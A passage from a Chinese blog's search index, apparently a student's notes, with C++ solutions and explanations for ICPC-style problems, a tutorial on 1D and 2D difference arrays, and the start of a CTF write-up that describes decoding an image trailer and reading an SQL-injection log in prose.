cor[e[i].x] * 1e6 + cor[e[i].y]; else tmp = cor[e[i].y] * 1e6 + cor[e[i].x]; if(mp.find(tmp) == mp.end()) mp[tmp] = ++cnt; g[mp[tmp]].emplace_back(e[i].x, e[i].y); } } for(ll i = 1; i \u003c= n; i++){ if(find(i) == i){ inans[cor[i]] += siz[i] * siz[i]; } } for(ll i = 1; i \u003c= cnt; i++){ for(ll j = 0; j \u003c g[i].size(); j++){ ll xx = find1(g[i][j].first), yy = find1(g[i][j].second); stans[i] += (ll)siz[xx] * (ll)siz[yy] * 2; merge(g[i][j].first, g[i][j].second); } for(ll j = 0; j \u003c g[i].size(); j++) undo(); } while (k--){ ll x, y; cin \u003e\u003e x \u003e\u003e y; ll ans = inans[x] + inans[y]; if(x \u003e y) swap(x, y); ll tmp = x * 1e6 + y; if(g[mp[tmp]].size() == 0) cout \u003c\u003c ans \u003c\u003c '\\n'; else cout \u003c\u003c (ll)(ans + stans[mp[tmp]]) \u003c\u003c '\\n'; } } int main() { ios::sync_with_stdio(false); cin.tie(0), cout.tie(0); int t; t = 1; while(t--){ solve(); } return 0; }","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:2:5","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"D-小红的好串 前缀和 子串变形\r思路\r不难发现好串就是尽可能平均分配。 根据len % 3可以分类讨论：令t = len / 3 %= 0:平均 %= 1：t, t, t + 1、t, t + 1, t、t+1,t,t三种情况中的最小值 %=2：同上也是三种情况的最小值。 注意len \u003c 2的时候值为0 考虑到枚举是O(N^2)必然TLE。 发现更改后的字符串是由三组连续的字符组成。则分三段思考，每一段都是变为一个字符C，那么用前缀和就可以维护一段区间都变成字符C的最小次数。因此预处理三个前缀和，即可 代码\r#include\u003cbits/stdc++.h\u003e using namespace std; int sum[100010][4]; int solve(int l, int r, int c){ return sum[r][c] - sum[l - 1][c]; } int main(){ string s; int n, q; cin \u003e\u003e n \u003e\u003e q; cin \u003e\u003e s; s = '?' + s; for(int i = 1; i \u003c= n; i++){ if(s[i] == 'r'){ sum[i][1] = sum[i - 1][1]; sum[i][2] = sum[i - 1][2] + 1; sum[i][3] = sum[i - 1][3] + 1; } if(s[i] == 'e'){ sum[i][1] = sum[i - 1][1] + 1; sum[i][2] = sum[i - 1][2]; sum[i][3] = sum[i - 1][3] + 1; } if(s[i] == 'd'){ sum[i][1] = sum[i - 1][1] + 1; sum[i][2] = sum[i - 1][2] + 1; sum[i][3] = sum[i - 1][3]; } } while(q--){ int l, r; cin \u003e\u003e l \u003e\u003e r; int len = r - l + 1; if(len \u003c= 2) { cout \u003c\u003c 0 \u003c\u003c '\\n'; } else{ int ans = len; int d = len / 3; if(len % 3 == 0){ ans = min(ans, solve(l, l + d - 1, 1) + solve(l + d, l + 2 * d - 1, 2) + solve(l + 2 * d, r, 3)); }else if(len % 3 == 2){ ans = min(ans, solve(l, l + d - 1, 1) + solve(l + d, l + 2 * d, 2) + solve(l + 2 * d + 1, r, 3)); ans = min(ans, solve(l, l + d, 1) + solve(l + d + 1, l + 2 * d, 2) + solve(l + 2 * d + 1, r, 3)); ans = min(ans, solve(l, l + d, 1) + solve(l + d + 1, l + 2 * d + 1, 2) + solve(l + 2 * d + 2, r, 3)); }else{ ans = min(ans, solve(l, l + d, 1) + solve(l + d + 1, l + 2 * d, 2) + solve(l + 2 * d + 1, r, 3)); ans = min(ans,solve(l, l + d - 1, 1) + solve(l + d, l + 2 * d, 2) + solve(l + 2 * d + 1, r , 3)); ans = min(ans,solve(l, l + d - 1, 1) + solve(l + d, l + 2 * d - 1, 2) + solve(l + 2 * d, r, 3)); } cout \u003c\u003c ans \u003c\u003c '\\n'; } } return 0; }","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:2:6","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"位运算\r","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:3:0","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"D. Birthday Gift\r题意：\r将数组划分为k个连续段，使得： 求出每个连续段的异或和 这些异或和作或运算，最终答案小于等于x 。 求最大的k，或报告这不可能(输出-1）。 题解：\r拆位，单独思考每一位 若要让最终结果的每一位为0，那么这一位的1的数量必然为偶数个，否则这一位为1 令x++，使\u003c=变为\u003c；若要满足最终答案小于x则x为0的地方最终结果必然为0，即该位的1的数量为偶数个。对于x为1的地方，让x这一位和最终结果这一位均为0同时高位一致或最终结果对应位为0，此时低位任意均满足条件，则此时答案即为高位满足条件的连续段的个数。 使用一个二进制串state用于check高位是否满足条件，使用异或前缀和进行高位检验。要检验高位是否满足条件，若高位为0，则必须为0，若为1，则0、1都可以，所以只需要检验高位中为0的数位，所以令state中只有高位的0位置是1。使用异或前缀和\u0026state,若值为0（高位对应为0的地方都为0，其他地方无所谓），说明是该前缀和到上一个值为0的前缀和之间的段是可行的段。遍历一遍前缀和求所有\u0026之后值为0的数量即为ans。 从高到低枚举x的每一位，若该位为0，判断若这一位1的数量为奇数，则结束，否则令state中这一位为1。若为1，如果这一位1的数量为偶数则check（注意check用的state认定这一位是0）并更新答案。 代码：\rvoid solve() { int n, x; cin \u003e\u003e n \u003e\u003e x; vector\u003cint\u003e a(n + 1), pre(n + 1, 0); int cnt[31]{}; for(int i = 1; i \u003c= n; i++){ cin \u003e\u003e a[i]; pre[i] = pre[i - 1] ^ a[i];//异或前缀和 for(int j = 0; j \u003c= 30; j++) cnt[j] += (a[i] \u003e\u003e j \u0026 1);//统计每一位1的个数 } if(pre[n] \u003e x){ cout \u003c\u003c -1 \u003c\u003c '\\n'; return; } x += 1;// sum \u003c= x -\u003e sum \u003c x + 1 auto solve = [\u0026](int state){ int ans = 0; for(int i = 1; i \u003c= n; i++){ ans += (pre[i] \u0026 state) == 0; } return ans; }; int ans = 0, state = 0; for(int i = 30; i \u003e= 0; i--){ int bit = x \u003e\u003e i \u0026 1; if(bit == 1){ if(cnt[i] % 2 == 0){ ans = max(ans, solve(state | (1 \u003c\u003c i)));//state | (1 \u003c\u003c i) 本位为0去check } }else{ if(cnt[i] % 2) break; state |= 1 \u003c\u003c i; } } cout \u003c\u003c ans \u003c\u003c '\\n'; }","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:3:1","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"D - Popcount and XOR (atcoder.jp)\r题意\r题解\r代码\rll f[64]; ll x[64]; ll y[64]; ll ksm(ll a, ll b){ ll ret = 1; while(b){ if(b \u0026 1) ret = (ret * a); a = a * a; b \u003e\u003e= 1; } return ret; } void solve(){ ll a, b, c; cin \u003e\u003e a \u003e\u003e b \u003e\u003e c; ll cnt = 0; for(ll i = 63; i \u003e= 0; i--){ f[i] = c \u003e\u003e i \u0026 1; if(f[i]) cnt++; } if((a + b + cnt) % 2 != 0 || a + b + cnt \u003e 120 || a \u003e b + cnt || b \u003e cnt + a || cnt \u003e a + b){ cout \u003c\u003c \"-1\" \u003c\u003c endl; return; } ll d = (a + b - cnt) / 2; ll cnta = 0; ll tara = a - d; for(ll i = 0; i \u003c 64; i++){ if(f[i]){ if(cnta \u003c tara){ x[i] = 1; cnta++; }else{ y[i] = 1; } } } for(ll i = 0; i \u003c 64; i++){ if(d \u003e 0){ if(x[i] || y[i]) continue; x[i] = y[i] = 1; d--; } } ll ansa = 0, ansb = 0; for(ll i = 0; i \u003c 64; i++){ ansa += x[i] * ksm(2, i); ansb += y[i] * ksm(2, i); } cout \u003c\u003c ansa \u003c\u003c ' ' \u003c\u003c ansb; }","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:3:2","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"[Problem - B - Codeforces] 任意分配 二进制贪心\r思路\r能够进行n次操作，每次操作选择i,j,x 令a_i = a_i + x, a_j = a_j - x 因为可以进行n次操作，所以可以实现任意分配： 1.先将全部数聚集到一个位置（假设为1）上，使用n-1次操作 2.任意分配使用n-1次操作 3.实际分配时省略1，n次操作完全可以实现任意分配 要求求所有数或之后的最小值，涉及到二进制时在二进制下考虑，由于可以实现任意分配，则变为在二进制中分配1。 考虑某一位不用放1的情况即为，在这一位之前的位可以将sum全部放下，即sum \u003c= ((1 « pos) - 1)*n。此时不需要在pos位放数，因为二进制情况下，pos位以下所有2的幂次的和小于2的pos次方。 当这一位一定需要放1的时候，那么尽可能放最多的1，因为或情况下只要这一位只要有1个1，这一位就有贡献，所以放最多的1是最好的方案，x=min(n, sum/(1 « pos) ) code\r#include \u003ccstdio\u003e #include \u003calgorithm\u003e #include \u003ciostream\u003e #include \u003ccmath\u003e #include \u003cbits/stdc++.h\u003e #define input_int(n) scanf(\"%d\", \u0026n) using namespace std; typedef long long ll; typedef unsigned long long ull; typedef vector\u003cint\u003e vi; typedef pair\u003cint, int\u003e pii; ll a[200010]; ll ans[33]; void solve(){ ll n; cin \u003e\u003e n; ll sum = 0; for(ll i = 1; i \u003c= n; i++) cin \u003e\u003e a[i], sum += a[i]; for(ll i = 31; i \u003e= 0; i--){ if(sum \u003c= ((1 \u003c\u003c i) - 1) * n) continue; ll x = min(n, sum / (1 \u003c\u003c i)); ans[i] = 1; sum -= x * (1 \u003c\u003c i); } ll ret = 0; for(ll i = 0; i \u003c= 32; i++){ if(ans[i]){ ret += (1 \u003c\u003c i); } } cout \u003c\u003c ret; } int main() { ios::sync_with_stdio(false); cin.tie(0), cout.tie(0); int t; t = 1; while(t--){ solve(); } return 0; }","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:3:3","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"二分查找\r","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:4:0","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"C. Tree Cutting\r题意：\rn个点，n-1条边，问严格去除k条边后剩下的连通块中最小值的最大值是多少。 题解：\r注意到答案具有单调性，可以考虑二分查找最大值。 check过程：dfs，对于pos节点，dfs其子节点，如果siz[子节点] \u003c mid 那么这个子树不可以去掉，如果 \u003e= mid 说明这个子树可以去掉 cnt++，dfs过程中统计可以去掉的数量cnt。结束后检验siz[1]是否\u003c mid，如果是则需要cnt–(这时1所在连通块之外的连通块结点数均\u003e= mid, 任意连一边即可)。比较cnt和mid，如果cnt \u003e= mid（cnt次操作满足条件，更少操作肯定满足） 则为true, 否则为false 代码:\r#include \u003ccstdio\u003e #include \u003calgorithm\u003e #include \u003ciostream\u003e #include \u003ccmath\u003e #include \u003cbits/stdc++.h\u003e #define input_int(n) scanf(\"%d\", \u0026n) using namespace std; typedef long long ll; typedef unsigned long long ull; typedef vector\u003cint\u003e vi; typedef pair\u003cint, int\u003e pii; const int N = 1e5 + 10; vector\u003cint\u003e g[100010]; int siz[100010]; priority_queue\u003cint, vector\u003cint\u003e, greater\u003cint\u003e \u003e que; int cnt = 0; int n, k; int ans = 0; void dfs(int pos,int fa, int x){ siz[pos] = 1; for(int v : g[pos]){ if(v == fa) continue; dfs(v, pos, x); if(siz[v] \u003e= x) ans++; else siz[pos] += siz[v]; } } bool check(int x){ ans = 0; dfs(1, 0, x); if(siz[1] \u003c x) ans--; return ans \u003e= k; } void solve(){ cin \u003e\u003e n \u003e\u003e k; for(int i = 1; i \u003c= n; i++){ g[i].clear(), siz[i] = 0; } for(int i = 0; i \u003c n - 1; i++){ int u, v; cin \u003e\u003e u \u003e\u003e v; g[u].push_back(v); g[v].push_back(u); } int l = 1, r = n; int ret = 0; while(l \u003c= r){ int mid = (l + r) \u003e\u003e 1; if(check(mid)){ ret = mid; l = mid + 1; }else{ r = mid - 1; } } cout \u003c\u003c ret \u003c\u003c '\\n'; } int main() { ios::sync_with_stdio(false); cin.tie(0), cout.tie(0); int t; cin \u003e\u003e t; while(t--){ solve(); } return 0; }","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:4:1","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"图论\r","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:5:0","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"[P3469 POI2008] BLO-Blockade\r思路\r请你对于每个节点 i 求出，把与节点 i 关联的所有边去掉以后（不去掉节点 i*本身），无向图有多少个有序点 （x,*y)，满足 x 和 y 不连通。 找割点。 若点i不是割点，显然答案为2 * （n - 1) 若点i是割点，则去掉点i后的每一个子树（分为两部分，回退边low \u003e= num[i]的子树和low\u003cnum[i]的子树）都和其他子树间的点构成满足条件的有序点对，ans += siz[i] * (n - siz[i])。其次加上点i与其他点构成的有序对ans += n - 1。 code\r#include \u003ccstdio\u003e #include \u003calgorithm\u003e #include \u003ciostream\u003e #include \u003ccmath\u003e #include \u003cbits/stdc++.h\u003e #define input_int(n) scanf(\"%d\", \u0026n) using namespace std; typedef long long ll; typedef unsigned long long ull; typedef vector\u003cint\u003e vi; typedef pair\u003cint, int\u003e pii; const int N = 100010; ll low[N], num[N], dfn, siz[N]; bool iscut[N]; vector\u003cint\u003e g[N]; int root; ll ans[N]; int n, m; void dfs(int pos, int fa){ low[pos] = num[pos] = ++dfn; siz[pos] = 1; ll r = n - 1; ans[pos] = r;//本身 for(int i = 0; i \u003c g[pos].size(); i++){ int y = g[pos][i]; if(!num[y]){ dfs(y, pos); siz[pos] += siz[y]; low[pos] = min(low[pos], low[y]); if(low[y] \u003e= num[pos]){ ans[pos] += (n - siz[y]) * siz[y], r -= siz[y];//导致成为割点的子块 } }else if(num[y] \u003c num[pos] \u0026\u0026 y != fa){ low[pos] = min(low[pos], num[y]); } } ans[pos] += r * (n - r);//不导致成为割点的子块 } void solve(){ cin \u003e\u003e n \u003e\u003e m; for(int i = 1; i \u003c= m; i++){ int x, y; cin \u003e\u003e x \u003e\u003e y; g[x].push_back(y); g[y].push_back(x); } root = 1, dfs(1, 1); for(int i = 1; i \u003c= n; i++) cout \u003c\u003c ans[i] \u003c\u003c '\\n'; } int main() { ios::sync_with_stdio(false); cin.tie(0), cout.tie(0); int t; t = 1; while(t--){ solve(); } return 0; }","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:5:1","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"E - Clique Connect (最小生成树)\r思路\rcode\r#include \u003ccstdio\u003e #include \u003calgorithm\u003e #include \u003ciostream\u003e #include \u003ccmath\u003e #include \u003cbits/stdc++.h\u003e #define input_int(n) scanf(\"%d\", \u0026n) using namespace std; typedef long long ll; typedef unsigned long long ull; typedef vector\u003cint\u003e vi; typedef pair\u003cint, int\u003e pii; const int N = 200010; ll st[N]; unordered_map\u003cll, ll\u003e mp; struct node{ ll cost; vector\u003cll\u003e ver; }f[N]; bool cmp(struct node a, struct node b){ if(a.cost == b.cost){ return a.ver.size() \u003e b.ver.size(); } return a.cost \u003c b.cost; } int fa[N]; int find(int x){ if(fa[x] != x){ fa[x] = find(fa[x]); } return fa[x]; } bool add(int a, int b){ int faa = find(a), fbb = find(b); if(faa == fbb) return false; fa[faa] = fbb; return true; } void solve(){ ll n, m; cin \u003e\u003e n \u003e\u003e m; for(int i = 1; i \u003c= n; i++){ fa[i] = i; } for(ll i = 1; i \u003c= m; i++){ ll k, c; cin \u003e\u003e k \u003e\u003e c; f[i].cost = c; for(ll j = 1; j \u003c= k; j++){ ll tmp; cin \u003e\u003e tmp; f[i].ver.push_back(tmp); } } ll cnt = n; ll ans = 0; sort(f + 1, f + 1 + m, cmp); for(int i = 1; i \u003c= m; i++){ for(int j = 1; j \u003c f[i].ver.size(); j++){ if(add(f[i].ver[j], f[i].ver[j - 1])){ ans += f[i].cost; cnt--; } } } if(cnt \u003e 1) cout \u003c\u003c -1; else cout \u003c\u003c ans; } int main() { ios::sync_with_stdio(false); cin.tie(0), cout.tie(0); int t; t = 1; while(t--){ solve(); } return 0; }","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:5:2","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"构造 思维\r","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:6:0","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"Problem - D - Codeforces\r思路\rcode\r#include \u003ccstdio\u003e #include \u003calgorithm\u003e #include \u003ciostream\u003e #include \u003ccmath\u003e #include \u003cbits/stdc++.h\u003e #define input_int(n) scanf(\"%d\", \u0026n) using namespace std; typedef long long ll; typedef unsigned long long ull; typedef vector\u003cint\u003e vi; typedef pair\u003cint, int\u003e pii; void solve(){ int n, k; cin \u003e\u003e n \u003e\u003e k; int st = 1; int t = k; vector\u003cint\u003e ans; if(k == 1){ ans.push_back(2); ans.push_back(3); ans.push_back(4); st = 8; for(int i = 3; i \u003c= 24; i++){ ans.push_back(st); st *= 2; } cout \u003c\u003c ans.size() \u003c\u003c endl; for(auto it : ans){ cout \u003c\u003c it \u003c\u003c ' '; } cout \u003c\u003c endl; return; } while(st \u003c t){ ans.push_back(st); t -= st; st *= 2; } if(t - 1) ans.push_back(t - 1); ans.push_back(k + 1); ans.push_back(k * 2 + 1); ans.push_back(k * 3 + 1); ans.push_back(k * 4 + 1); st = k * 8 + 1; int len = ans.size(); for(int i = len + 1; i \u003c= 25 ; i ++){ ans.push_back(st); st = st * 2 - 1; } cout \u003c\u003c ans.size() \u003c\u003c endl; for(auto it : ans){ cout \u003c\u003c it \u003c\u003c ' '; } cout \u003c\u003c endl; } int main() { ios::sync_with_stdio(false); cin.tie(0), cout.tie(0); int t; cin \u003e\u003e t; while(t--){ solve(); } return 0; }","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:6:1","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"数学\r","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:7:0","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"https://ac.nowcoder.com/acm/contest/84444/F\r思路\r将X分为Y个数的乘积： 不同质因数之间互不影响 同一个质因数之间使用插板法 插板法条件：元素相同 n个分成m个，m个不为空，方案数C(n - 1, m - 1); m个可以为空,方案数C(n + m - 1, m - 1); 答案为： $$ \\prod_{所有质因数} C(n + m -1, m - 1) $$ 代码\r#include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; ll mod = 1e9 + 7; ll jc[100010]; ll inv[55]; ll ksm(ll a, ll b, ll n){ ll res = 1; while(b){ if(b \u0026 1) res = (res * a) % n; a = (a * a) % n; b \u003e\u003e= 1; } return res; } ll C(ll n,ll m){ //组合数 ll ans=1; for(ll i=m+1;i\u003c=n;i++) ans=ans*i%mod; return ans*ksm(jc[n-m],mod-2, mod)%mod; } int main(){ jc[1]=jc[0]=1; for(ll i=2;i\u003c=100000;i++) jc[i]=jc[i-1]*i%mod; int t; cin \u003e\u003e t; while(t--){ ll x, y; cin \u003e\u003e x \u003e\u003e y; ll ans = 1; for(int i = 2; i \u003c= x / i; i++){ if(x % i == 0){ ll cnt = 0; while(x % i == 0){ cnt++; x /= i; } cnt += y - 1; ans = (ans * C(cnt, y - 1)) % mod; } } if(x \u003e 1){ ans = (ans * C(y, y - 1)) % mod; } cout \u003c\u003c ans \u003c\u003c '\\n'; } return 0; }","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:7:1","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"比赛\r【LGR-177-Div.3】洛谷基础赛 #8 \u0026 Westlake OI #1 - 洛谷 | 计算机科学教育新生态 (luogu.com.cn) Tasks - Toyota Programming Contest 2024#3（AtCoder Beginner Contest 344） F、G Dashboard - Codeforces Round 931 (Div. 2) - Codeforces ","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:8:0","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["算法和数据结构"],"content":"【数组】 差分\r","date":"2024-06-11","objectID":"/posts/%E5%B7%AE%E5%88%86/:0:0","tags":["算法"],"title":"差分","uri":"/posts/%E5%B7%AE%E5%88%86/"},{"categories":["算法和数据结构"],"content":"前缀和 与 差分\r我在前面的两篇博客里面简要介绍了一下一维、二维数组的前缀和的一些知识点，提到前缀和，那很自然地就会提到差分的概念。 首先我们回顾一下前缀和：原数组a[n]和依据原数组构造出的新数组s[n]，s[n]是a[n]的前缀和数组。 俗话说，有来有往，阴阳交汇，分久必合、合久必分…… 总而言之，我们看到了新数组s[n]是原数组a[n]的前缀和数组，但我们都知道，事物之间的影响总是交互的，所以我们必然会想到原数组a[n]是新数组s[n]的什么？只是前缀和数组的原数组吗？ 现在让我们先把注意力投向求前缀和数组的公式： s[n] = s[n-1] + a[n];现在让我们抛开s[n]相对于a[n]前缀和的身份不谈，我们有一个普通s[n]，它的每一项s[n]都基于上一向s[n-1]的值 再加上一个常数a[n]。 这个常数a[n]正是数组s[n]与s[n-1]的差值。 那么我们变换公式：a[n] = s[n] - s[n-1]。 由此我们得到一个新但旧的数组即原数组，a[n]，称为s[n]数组的差分数组。 结论：s[n]是原数组a[n]的前缀和数组、a[n]是原数组s[n]的差分数组。 ","date":"2024-06-11","objectID":"/posts/%E5%B7%AE%E5%88%86/:1:0","tags":["算法"],"title":"差分","uri":"/posts/%E5%B7%AE%E5%88%86/"},{"categories":["算法和数据结构"],"content":"差分数组的用处\r差分数组和前缀和数组的用途相似，都是面对以区间为单位进行操作的需求。 差分将对区间进行的增减操作由O(n)优化为O(1)。 以下给出一道题目： 题目描述：\r输入一个长度为 n的整数序列。接下来输入 m个操作，每个操作包含三个整数 l,r,c，表示将序列中 [l,r]之间的每个数加上 c。\r请你输出进行完所有操作后的序列。我们需要对一个区间进行加减操作，如果按照朴素思想，我们需要从左端点遍历都右端点，时间复杂度为O(n)。进行m次操作的时间复杂度就是O(mn)。 而对差分数组进行操作，再求一遍前缀和的时间复杂度是O(m+n)如图，对查分数组的某一个元素+1，则原数组从这个元素开始的元素都会加一。因此，再让区间外的第一个元素减一就能实现这个区间内的元素加一，以此类推。 { #include \u003ciostream\u003e #define N 100010 using namespace std; int f[N]; int s[N]; int main() { int n,m; cin \u003e\u003e n \u003e\u003e m; for(int i = 1; i \u003c= n; i++) { cin \u003e\u003e f[i]; s[i] = f[i] - f[i-1]; } while(m--) { int l,r,c; cin \u003e\u003e l \u003e\u003e r \u003e\u003e c; s[l] += c; s[r+1] -= c; } for(int i =1 ; i \u003c= n; i++) { f[i] = f[i-1] + s[i]; cout \u003c\u003c f[i] \u003c\u003c ' '; } } }","date":"2024-06-11","objectID":"/posts/%E5%B7%AE%E5%88%86/:2:0","tags":["算法"],"title":"差分","uri":"/posts/%E5%B7%AE%E5%88%86/"},{"categories":["算法和数据结构"],"content":"二维差分\r同样地，二维数组也有差分。其目的仍然是对区间(子矩阵)进行操作。 在一维数组中，我们改变原数组的某一元素，会改变前缀和数组一段区间的值。 同样，在二维数组中，我们改变原数组的某一元素，会改变前缀和数组一个子矩阵的值。 首先，二维数组前缀和的几何意义是，从矩阵左上角到该元素的元素和。如图中的前缀和数组的(i,j)元素表示的是原数组绿色部分的元素和。 那么我们给这个原数组中元素加上一个1，前缀和数组在下图中的黄色部分都会加上一个1（该元素到矩阵右下角）。现在我们要让蓝色部分加上一个值X，但显然这样操作仍会对黄色部分加上值X。那么我们再让黄色区域减去这个X即可，同一维的是一个道理，注意重复的地方要加上一个X。 例题 2536. 子矩阵元素加 1 class Solution { public: vector\u003cvector\u003cint\u003e\u003e rangeAddQueries(int n, vector\u003cvector\u003cint\u003e\u003e\u0026 queries) { vector\u003cvector\u003cint\u003e\u003e tmp(n+1 , vector\u003cint\u003e(n+1,0)); int m = queries.size(); for(int i = 0; i \u003c m; i++) { tmp[queries[i][0]][queries[i][1]]++; tmp[queries[i][0]][queries[i][3]+1]--; tmp[queries[i][2]+1][queries[i][1]]--; tmp[queries[i][2]+1][queries[i][3]+1]++; }//对差分数组进行操作 vector\u003cvector\u003cint\u003e\u003e ans(n , vector\u003cint\u003e(n , 0)); ans[0][0] = tmp[0][0]; for(int i = 0; i \u003c n; ++i) for(int j = 1; j \u003c n; ++j) tmp[i][j] += tmp[i][j-1]; for(int i = 1; i \u003c n; ++i) for(int j = 0; j \u003c n; ++j) tmp[i][j] += tmp[i-1][j]; for(int i = 0; i \u003c n; ++i) for(int j = 0; j \u003c n; ++j) ans[i][j] = tmp[i][j]; //由于下标从0开始，所以分布求前缀和要方便一点 //这种写法不存在重复加的地方，第一个for求一维前缀和，第二个for加上前面行的和。 return ans; } }; ","date":"2024-06-11","objectID":"/posts/%E5%B7%AE%E5%88%86/:3:0","tags":["算法"],"title":"差分","uri":"/posts/%E5%B7%AE%E5%88%86/"},{"categories":["信息安全"],"content":"WriteUp\r名称\rxxxxx 排名\r3 解题思路\r","date":"2024-06-11","objectID":"/posts/%E6%8A%BD%E8%B1%A1%E6%A0%A1%E8%B5%9B/:0:0","tags":["CTF"],"title":"抽象校赛","uri":"/posts/%E6%8A%BD%E8%B1%A1%E6%A0%A1%E8%B5%9B/"},{"categories":["信息安全"],"content":"MISC\r","date":"2024-06-11","objectID":"/posts/%E6%8A%BD%E8%B1%A1%E6%A0%A1%E8%B5%9B/:1:0","tags":["CTF"],"title":"抽象校赛","uri":"/posts/%E6%8A%BD%E8%B1%A1%E6%A0%A1%E8%B5%9B/"},{"categories":["信息安全"],"content":"CTF1\r用010编辑器打开图片，文件末尾字符串粘贴至编码工具解码即可 ","date":"2024-06-11","objectID":"/posts/%E6%8A%BD%E8%B1%A1%E6%A0%A1%E8%B5%9B/:1:1","tags":["CTF"],"title":"抽象校赛","uri":"/posts/%E6%8A%BD%E8%B1%A1%E6%A0%A1%E8%B5%9B/"},{"categories":["信息安全"],"content":"CTF3\r首先使用筛选工具将含password文本的行筛选出来再进行url解码，将获得的文本放入txt中进行分析。 可以发现这个txt文本是报错注入的日记文件，只需要将查询flag的没报错的语句的查询值（ascii）拼接起来就是flag ","date":"2024-06-11","objectID":"/posts/%E6%8A%BD%E8%B1%A1%E6%A0%A1%E8%B5%9B/:1:2","tags":["CTF"],"title":"抽象校赛","uri":"/posts/%E6%8A%BD%E8%B1%A1%E6%A0%A1%E8%B5%9B/"},{"categories":["信息安全"],"content":"xxxxxxxxxx25 1class Solution {2public:3 vector\u003cvector\u003e rangeAddQueries(int n, vector\u003cvector\u003e\u0026 queries) {4 vector\u003cvector\u003e tmp(n+1 , vector(n+1,0));5 int m = queries.size();6 for(int i = 